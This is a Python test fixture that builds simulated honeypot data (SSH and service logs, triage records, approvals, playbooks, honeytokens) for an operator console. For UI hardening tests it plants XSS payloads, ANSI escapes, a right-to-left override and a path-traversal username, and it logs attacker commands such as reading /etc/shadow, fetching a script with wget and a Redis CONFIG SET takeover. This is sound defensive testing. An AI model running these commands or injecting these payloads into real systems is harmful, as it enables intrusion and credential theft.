"""A realistic data tree for the operator console, written with the real writers.

``build_tree(root)`` lays out reports, state, data, detections, overlay, source state,
playbooks and an event log under ``root`` and returns a ``Tree`` with their paths and the
ids worth asserting on. Times are relative to the current clock so the overview windows
see them. Hostile values (markup, ANSI escapes, a right-to-left override, a 50,000
character command, a traversal username) are planted where attackers would put them.

Seed a manual run of the console with::

    python tests/ui_fixture.py <dir>
"""

from __future__ import annotations

import base64
import datetime
import json
import sys
import uuid
from dataclasses import dataclass, field
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from agents import triage  # noqa: E402
from agents.addresses import public_for_tests  # noqa: E402
from agents.playbooks import Playbook  # noqa: E402
from agents.respond import approve, queue_enforce_action, reject  # noqa: E402
from agents.source_state import SourceState, new_entry  # noqa: E402
from agents.triage import CredentialStats, GeoInfo, Ioc, TriageRecord  # noqa: E402
from agents.ui.api import ApiPaths  # noqa: E402
from listeners.events import EventWriter  # noqa: E402

UTC = datetime.timezone.utc

SCRIPT = "<script>alert(1)</script>"
IMG = "\"><img src=x onerror=1>"
ANSI = "\x1b[31mred\x1b[0m \x1b]0;title\x07"
RLO = "echo ‮txt.exe‬ done"
LONG_COMMAND = "A" * 50_000
TRAVERSAL_USER = "../../etc/passwd"
HOSTILE = (SCRIPT, IMG, ANSI, RLO, TRAVERSAL_USER)

HONEYTOKEN_NAME = "aws_backup_key"
HONEYTOKEN_VALUE = "wnt-backup-canary-value-1"
DETECTION_PENDING = "0a1b2c3d-ssh-download-execute.yml"
DETECTION_APPROVED = "4e5f6a7b-redis-config-set.yml"


@dataclass
class Tree:
    root: Path
    reports: Path
    state: Path
    data: Path
    detections: Path
    overlay: Path
    source_state: Path
    playbooks: Path
    log: Path
    now: datetime.datetime
    ids: dict = field(default_factory=dict)

    def api_paths(self) -> ApiPaths:
        return ApiPaths(reports=self.reports, state=self.state, data=self.data,
                        detections=self.detections, overlay=self.overlay,
                        source_state=self.source_state, playbooks=self.playbooks, log=self.log)


def _b64(text: str) -> str:
    return base64.b64encode(text.encode()).decode()


def _ts(dt: datetime.datetime) -> str:
    return dt.isoformat(timespec="milliseconds")


def ssh_lines(sid: str, ip: str, start: datetime.datetime, auth: list[tuple[str, str, bool]],
              commands: list[str]) -> list[dict]:
    """Lines in the SSH server's JSON log format for one connection."""
    base = {"level": "INFO", "task_name": sid, "src_ip": ip, "src_port": 50022,
            "dst_ip": "10.0.0.5", "dst_port": 22, "sensor_name": "fixture",
            "sensor_protocol": "ssh"}
    t = start
    step = datetime.timedelta(seconds=2)
    lines = [dict(base, timestamp=_ts(t), message="SSH connection received")]
    for user, password, ok in auth:
        t += step
        lines.append(dict(base, timestamp=_ts(t), username=user, password=password,
                          message="Authentication success" if ok else "Authentication failed"))
    for command in commands:
        t += step
        lines.append(dict(base, timestamp=_ts(t), message="User input", details=_b64(command),
                          interactive=True))
        t += step
        lines.append(dict(base, timestamp=_ts(t), message="LLM response",
                          details=_b64(f"{command[:40]}: done\n$ "), interactive=True))
    t += step
    lines.append(dict(base, timestamp=_ts(t), message="SSH connection closed"))
    return lines


def _append(path: Path, lines: list[dict]) -> None:
    with open(path, "a", encoding="utf-8") as f:
        for line in lines:
            f.write(json.dumps(line) + "\n")


# ---- the map: invented places for documentation addresses ----------------------------------

# Address -> (country code, country, city, (latitude, longitude)). The real lookup places no
# documentation address; ``FakeGeo`` stands in for it so the map has somewhere to draw.
MAP_PLACES = {
    "198.51.100.7": ("DE", "Germany", "Frankfurt am Main", (50.1, 8.7)),
    "198.51.100.8": ("BR", "Brazil", "São Paulo", (-23.5, -46.6)),
    "198.51.100.20": ("US", "United States", "Ashburn", (39.0, -77.5)),
    "198.51.100.21": ("NL", "Netherlands", "Amsterdam", (52.4, 4.9)),
    "198.51.100.66": ("SG", "Singapore", SCRIPT, (1.3, 103.8)),
    "203.0.113.10": ("CN", "China", "Shanghai", (31.2, 121.5)),
    "203.0.113.11": ("IN", "India", "Mumbai", (19.1, 72.9)),
    "203.0.113.12": ("RU", "Russia", "Moscow", (55.8, 37.6)),
    "203.0.113.13": ("ZA", "South Africa", "Johannesburg", (-26.2, 28.0)),
    "203.0.113.14": ("AU", "Australia", "Sydney", (-33.9, 151.2)),
    "203.0.113.15": ("JP", "Japan", "Tokyo", (35.7, 139.7)),
    "203.0.113.16": ("US", "United States", "San Jose", (37.3, -121.9)),
    "203.0.113.17": ("KR", "South Korea", "Seoul", (37.6, 127.0)),
    "203.0.113.18": ("VN", "Vietnam", "Hanoi", (21.0, 105.8)),
    "203.0.113.19": ("GB", "United Kingdom", "London", (51.5, -0.1)),
    "203.0.113.20": ("IR", "Iran", "Tehran", (35.7, 51.4)),
    "203.0.113.21": ("NG", "Nigeria", "Lagos", (6.5, 3.4)),
    "203.0.113.22": ("AR", "Argentina", "Buenos Aires", (-34.6, -58.4)),
    "203.0.113.23": ("CA", "Canada", "Toronto", (43.7, -79.4)),
    "203.0.113.24": ("FR", "France", "Paris", (48.9, 2.4)),
}
# Services, the port each listens on, and what an event of each looks like.
MAP_SERVICES = [("ssh", 22), ("http", 8080), ("telnet", 23), ("ftp", 21), ("redis", 6379),
                ("sip", 5060), ("mysql", 3306), ("smtp", 25)]


class FakeGeo:
    """``GeoLookup``'s shape (``lookup``, ``point``, ``enabled``) over ``MAP_PLACES``."""

    enabled = True
    attribution = ""

    def __init__(self, places: dict = MAP_PLACES) -> None:
        self.places = places

    def __call__(self, address):
        return self.lookup(address)

    def lookup(self, address):
        hit = self.places.get(address) if isinstance(address, str) else None
        if hit is None:
            return None
        return GeoInfo(country_code=hit[0], country=hit[1], city=hit[2], asn=64500,
                       as_org="Example Hosting")

    def point(self, address):
        hit = self.places.get(address) if isinstance(address, str) else None
        return hit[3] if hit is not None else None


def map_lines(start: datetime.datetime, count: int, step: float = 1.0, seed: int = 7,
              sources=None) -> list[dict]:
    """``count`` listener and SSH lines, ``step`` seconds apart from ``start``, from the
    ``MAP_PLACES`` sources and one unlocated one, across ``MAP_SERVICES``."""
    import random

    rng = random.Random(seed)
    sources = list(sources or MAP_PLACES) + ["192.0.2.99"]
    out = []
    for i in range(count):
        when = _ts(start + datetime.timedelta(seconds=i * step))
        src = rng.choice(sources)
        service, port = rng.choice(MAP_SERVICES)
        base = {"timestamp": when, "task_name": f"{service}-{seed:02d}{i:05d}", "src_ip": src,
                "src_port": 40000 + i % 20000, "dst_ip": "10.0.0.5", "dst_port": port,
                "sensor_name": "fixture", "sensor_protocol": service}
        if service == "ssh":
            if rng.random() < 0.5:
                out.append(dict(base, level="INFO", message="Authentication failed",
                                username=rng.choice(["root", "admin", "ubuntu"]),
                                password="123456"))
            else:
                out.append(dict(base, level="INFO", message="User input", interactive=True,
                                details=_b64(rng.choice(["uname -a", "cat /etc/passwd",
                                                         "wget -q -O- example.test/x.sh"]))))
        elif service in ("http", "sip"):
            path = rng.choice(["/.env", "/env.js", "/wp-login.php", "/api/v1/users"])
            out.append(dict(base, message="command", event="command",
                            data={"method": "GET", "path": path,
                                  "status": rng.choice([200, 404])} if service == "http"
                            else {"dialed": "1000", "stage": "invite"}))
        elif rng.random() < 0.5:
            out.append(dict(base, message="auth_attempt", event="auth_attempt",
                            username=rng.choice(["admin", "sa", "default"]), password="x",
                            success=False))
        else:
            out.append(dict(base, message="command", event="command",
                            data={"command": rng.choice(["INFO", "SELECT version()",
                                                         "CONFIG GET dir", "EHLO x"])}))
    return out


def _record(rid: str, kind: str, protocol: str, ip: str, seen: datetime.datetime,
            judgement: str, **kw) -> TriageRecord:
    stamp = seen.isoformat(timespec="seconds")
    kw.setdefault("intent", "RECONNAISSANCE")
    kw.setdefault("stage", "DISCOVERY")
    kw.setdefault("skill", "AUTOMATED")
    kw.setdefault("narrative", f"{protocol} activity from {ip}.")
    return TriageRecord(kind=kind, id=rid, protocol=protocol, src_ip=ip, first_seen=stamp,
                        last_seen=stamp, judgement=judgement, **kw)


def _write_json(path: Path, payload) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(payload, indent=2), encoding="utf-8")


def build_tree(root: Path | str) -> Tree:
    root = Path(root)
    now = datetime.datetime.now(UTC).replace(microsecond=0)
    today = now.date().isoformat()
    yesterday = (now - datetime.timedelta(days=1)).date().isoformat()
    tree = Tree(root=root, reports=root / "reports", state=root / "reports" / "state",
                data=root / "data", detections=root / "detections",
                overlay=root / "decoy" / "overlay.json",
                source_state=root / "decoy" / "source_state.json",
                playbooks=root / "playbooks", log=root / "data" / "ssh_log.log", now=now)
    for d in (tree.reports, tree.state, tree.data, tree.detections, tree.playbooks,
              tree.overlay.parent):
        d.mkdir(parents=True, exist_ok=True)

    # ---- event log: two SSH sessions and listener events ----
    sid_a = f"session-{uuid.UUID(int=0xA11CE).hex}"
    sid_b = f"session-{uuid.UUID(int=0xB0B).hex}"
    start = now - datetime.timedelta(hours=2)
    _append(tree.log, ssh_lines(sid_a, "198.51.100.7", start, [("root", "toor", True)],
                                ["uname -a", SCRIPT, ANSI, RLO, LONG_COMMAND,
                                 f"aws s3 ls --profile {HONEYTOKEN_VALUE}"]))
    writer = EventWriter(str(tree.log), sensor_name="fixture")
    for i in range(3):
        writer.emit(timestamp=_ts(start + datetime.timedelta(minutes=1, seconds=i)),
                    task_name=f"ftp-{i:04d}", src_ip="198.51.100.20", src_port=40000 + i,
                    dst_port=21, message="auth_attempt", sensor_protocol="ftp",
                    event="auth_attempt", username="admin", password=f"pass{i}")
    writer.emit(timestamp=_ts(start + datetime.timedelta(minutes=2)), task_name="redis-0001",
                src_ip="198.51.100.21", src_port=41000, dst_port=6379, message="command",
                sensor_protocol="redis", event="command",
                data={"command": "CONFIG SET dir /root/.ssh", "high_signal": True,
                      "signal": "redis_takeover"})
    _append(tree.log, ssh_lines(sid_b, "198.51.100.8", start + datetime.timedelta(minutes=5),
                                [(TRAVERSAL_USER, "x", False), (TRAVERSAL_USER, IMG, True)],
                                [IMG, "cat /etc/shadow"]))

    # ---- triage records ----
    rec_a = _record(sid_a, "session", "ssh", "198.51.100.7", start + datetime.timedelta(minutes=1),
                    "MALICIOUS", stage="EXECUTION", username="root", auth_attempts=1,
                    auth_successes=1, commands=6, honeytokens=[HONEYTOKEN_NAME],
                    high_signal={"download_execute": 1},
                    narrative=f"Ran {SCRIPT} and {ANSI} then {RLO}.",
                    command_sample=["uname -a", SCRIPT, ANSI, RLO, LONG_COMMAND[:300]],
                    iocs=[Ioc(type="url", value="http://198.51.100.9/x.sh")])
    rec_b = _record(sid_b, "session", "ssh", "198.51.100.8", start + datetime.timedelta(minutes=6),
                    "SUSPICIOUS", username=TRAVERSAL_USER, auth_attempts=2, auth_successes=1,
                    commands=2, command_sample=[IMG, "cat /etc/shadow"],
                    credentials=CredentialStats(top_usernames=[(TRAVERSAL_USER, 2)]))
    stamp = start.strftime("%Y%m%dT%H%M")
    rec_ftp = _record(f"campaign-ftp-198_51_100_20-{stamp}", "campaign", "ftp", "198.51.100.20",
                      start + datetime.timedelta(minutes=1), "BENIGN", auth_attempts=3,
                      connections=3,
                      credentials=CredentialStats(top_usernames=[("admin", 3)],
                                                  top_passwords=[("pass0", 1)]))
    rec_redis = _record(f"campaign-redis-198_51_100_21-{stamp}", "campaign", "redis",
                        "198.51.100.21", start + datetime.timedelta(minutes=2), "MALICIOUS",
                        intent="SERVICE_TAKEOVER", stage="PERSISTENCE",
                        high_signal={"redis_takeover": 1},
                        command_sample=["CONFIG SET dir /root/.ssh"])
    old = now - datetime.timedelta(days=3)
    rec_sip = _record(f"campaign-sip-unverified-{old.strftime('%Y%m%dT%H%M')}", "campaign", "sip",
                      "unverified", old, "SUSPICIOUS", unverified_source=True, connections=40,
                      src_addresses=["203.0.113.50", "203.0.113.51"], src_address_count=2)
    records = [rec_a, rec_b, rec_ftp, rec_redis, rec_sip]
    for r in records:
        triage.write_record(r, tree.reports)
    (tree.reports / "sessions" / "broken.json").write_text("{not json", encoding="utf-8")
    (tree.reports / "campaigns" / "wrong-shape.json").write_text("[1, 2]", encoding="utf-8")
    tree.ids.update(session_a=sid_a, session_b=sid_b, ftp=rec_ftp.id, redis=rec_redis.id,
                    sip=rec_sip.id)

    # ---- sensor limits and digests ----
    triage.record_sensor_limits(tree.reports, [
        {"day": today, "task": "http-limit-1", "protocol": "http", "reason": "rate_limited",
         "pool": None, "count": 5},
        {"day": today, "task": "sip-limit-1", "protocol": "sip", "reason": "inbound_drop",
         "pool": "udp", "count": 12}])
    triage.digest(tree.reports, day=today)
    triage.digest(tree.reports, day=yesterday)
    (tree.reports / "daily" / "notes.md").write_text("not a digest\n", encoding="utf-8")

    # ---- detections ----
    for kind, name in (("pending", DETECTION_PENDING), ("approved", DETECTION_APPROVED)):
        path = tree.detections / kind / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(f"title: {name}\ndescription: {SCRIPT}\ndetection:\n  sel: x\n",
                        encoding="utf-8")
    (tree.detections / "pending" / "README.md").write_text("ignored\n", encoding="utf-8")

    # ---- approvals: pending, rejected, done (two blocklist entries), overdue ----
    pb = Playbook.model_validate({
        "name": "fixture_pb", "description": f"Fixture playbook {SCRIPT}",
        "when": {"signals": ["redis_takeover"]},
        "steps": [{"action": "export_blocklist"}, {"action": "open_ticket"},
                  {"action": "publish_detection"}]})
    export, ticket, publish = pb.steps
    with public_for_tests("198.51.100.0/24"):
        _, pending = queue_enforce_action(tree.state, pb, rec_redis, export, now, 72, {},
                                          summary=f"block {rec_redis.src_ip} {SCRIPT}")
        _, rejected = queue_enforce_action(tree.state, pb, rec_ftp, ticket, now, 72,
                                           {"priority": "low"}, summary="ticket for ftp")
        reject(rejected, tree.state, by="fixture", now=now, reports_dir=tree.reports)
        done = []
        for r in (rec_a, rec_b):
            _, aid = queue_enforce_action(tree.state, pb, r, export, now, 72, {},
                                          summary=f"block {r.src_ip}")
            approve(aid, tree.state, tree.reports, tree.detections, by="fixture", now=now)
            done.append(aid)
        _, overdue = queue_enforce_action(tree.state, pb, rec_b, publish,
                                          now - datetime.timedelta(hours=100), 72,
                                          {"files": [DETECTION_PENDING]}, summary="publish")
    tree.ids.update(pending=pending, rejected=rejected, done=done, overdue=overdue)

    # ---- engine state, call counter, front-end budget, ship events ----
    _write_json(tree.state / "respond_state.json", {
        "processed": {rec_redis.id: now.isoformat()}, "day": today,
        "cooldowns": {f"fixture_pb|{rec_redis.src_ip}": now.isoformat(timespec="seconds")},
        "counts": {"fixture_pb": 3, "malware_drop": 1},
        "notify": {"sent": {"webhook": 2}, "by_playbook": {}, "suppressed": {},
                   "last_notice": {}}})
    _write_json(tree.state / "analyst_calls.json", {"day": today, "calls": 7})
    _write_json(tree.state / "triage_analyses_reused.json", {"day": today, "today": 3, "total": 9})
    _write_json(tree.data / "budget_state.json",
                {"day": today, "global_tokens": 123456, "ip_tokens": {"198.51.100.7": 1000}})
    with open(tree.state / "ship_events.jsonl", "w", encoding="utf-8") as f:
        for i in range(2):
            f.write(json.dumps({"timestamp": now.isoformat(), "event": "s3_put_failed",
                                "key": f"events/private-prefix/{i}.jsonl",
                                "error": "AccessDenied", "lines": 10 + i}) + "\n")
        f.write("{corrupt\n")

    # ---- overlay, tuner history and records, source state ----
    _write_json(tree.overlay, {"hostname": "build-07", "lures": ["/root/backup.tar.gz"],
                               "accounts": {"ftp": [{"username": "backup",
                                                     "password": "Summer2026"}]}})
    _write_json(tree.state / "tuner" / "overlay-snapshots" / "000001.json",
                {"n": 1, "timestamp": now.isoformat(timespec="seconds"), "action": "tune",
                 "changes": ["add_account ftp:backup"], "previous_overlay": None})
    _write_json(tree.reports / "tuner" / f"{now.strftime('%Y%m%dT%H%M%SZ')}-abc123.json",
                {"timestamp": now.strftime("%Y%m%dT%H%M%SZ"), "snapshot": 1,
                 "changes": [{"kind": "add_account", "service": "ftp", "username": "backup",
                              "password": "Summer2026", "reason": "seen 5 times"}],
                 "rejected": [f"FenceError: bad lure {SCRIPT}"], "commit": None})
    entry = new_entry("198.51.100.7", now).model_copy(update={"tags": ["malware_drop"],
                                                              "tarpit_ms": 500,
                                                              "reasons": ["malware_drop"]})
    tree.source_state.write_text(SourceState(entries={entry.key: entry}).model_dump_json(),
                                 encoding="utf-8")

    # ---- playbooks: one valid, one invalid ----
    (tree.playbooks / "fixture_pb.toml").write_text(
        'name = "fixture_pb"\ndescription = "Blocks redis takeovers."\n'
        "cooldown_minutes = 30\nmax_runs_per_day = 10\n\n[when]\n"
        'signals = ["redis_takeover"]\n\n[[steps]]\naction = "tag_source"\ntag = "redis"\n\n'
        '[[steps]]\naction = "export_blocklist"\n', encoding="utf-8")
    (tree.playbooks / "broken.toml").write_text('name = "broken"\n[[steps]]\naction = "rm"\n',
                                                encoding="utf-8")

    # ---- honeytoken registry ----
    _write_json(tree.reports / "honeytokens.json", {
        "scenario": "fixture", "tokens": [
            {"name": HONEYTOKEN_NAME, "kind": "aws_key", "value": HONEYTOKEN_VALUE,
             "planted_in": ["/root/.aws/credentials"]},
            {"name": "db_password", "kind": "password", "value": "wnt-db-canary-2",
             "planted_in": ["/srv/app/.env", SCRIPT]},
            {"name": "src_0123456789ab", "kind": "aws_key", "value": "wnt-src-canary-3",
             "planted_in": ["/root/.aws/credentials"], "planted_for": "198.51.100.7"},
            "not a token"]})
    return tree


if __name__ == "__main__":
    if len(sys.argv) != 2:
        sys.exit("usage: python tests/ui_fixture.py <dir>")
    built = build_tree(sys.argv[1])
    print(json.dumps({"reports": str(built.reports), "state": str(built.state),
                      "data": str(built.data), "detections": str(built.detections),
                      "overlay": str(built.overlay), "source_state": str(built.source_state),
                      "log": str(built.log), "ids": built.ids}, indent=2))
